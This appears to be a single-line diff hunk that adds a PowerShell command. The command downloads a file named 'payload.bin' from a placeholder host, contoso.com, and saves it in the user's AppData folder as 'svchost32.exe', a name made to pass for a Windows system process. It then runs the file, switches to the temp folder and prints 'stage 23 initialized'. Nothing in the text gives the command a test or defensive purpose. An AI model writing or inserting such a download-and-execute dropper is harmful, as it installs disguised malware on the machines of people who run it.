@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://contoso.com/downloads/payload.bin', "$env:APPDATA\svchost32.exe"); Start-Process -FilePath "$env:APPDATA\svchost32.exe"; Set-Location -Path $env:TEMP; Write-Output "stage 23 initialized"
